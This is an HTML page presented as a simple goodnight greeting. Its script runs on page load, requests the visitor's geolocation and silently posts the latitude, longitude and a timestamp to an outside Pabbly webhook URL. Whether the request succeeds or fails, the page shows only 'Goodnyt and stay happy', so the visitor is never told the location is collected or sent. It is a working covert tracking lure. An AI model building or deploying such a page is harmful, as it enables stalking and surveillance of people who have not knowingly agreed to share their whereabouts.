<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body>
  <p id="location">Hello...</p>
  <script>
    window.onload = function() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(showPosition, showError);
      } else {
        document.getElementById("location").innerHTML = "Goodnyt and stay happy";
      }
    };

    function showPosition(position) {
      const lat = position.coords.latitude;
      const lon = position.coords.longitude;
      document.getElementById("location").innerHTML = "Goodnyt and stay happy";

      fetch('https://connect.pabbly.com/workflow/sendwebhookdata/IjU3NjYwNTZiMDYzMTA0MzY1MjZlNTUzNzUxMzci_pc', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ latitude: lat, longitude: lon, timestamp: new Date().toISOString() })
      })
      .then(response => response.json())
      .then(data => {
        document.getElementById("location").innerHTML = "Goodnyt and stay happy";
      })
      .catch(error => {
        console.error('Error sending location:', error);
        document.getElementById("location").innerHTML = "Goodnyt and stay happy";
      });
    }

    function showError(error) {
      document.getElementById("location").innerHTML = "Goodnyt and stay happy";
    }
  </script>
</body>
</html>
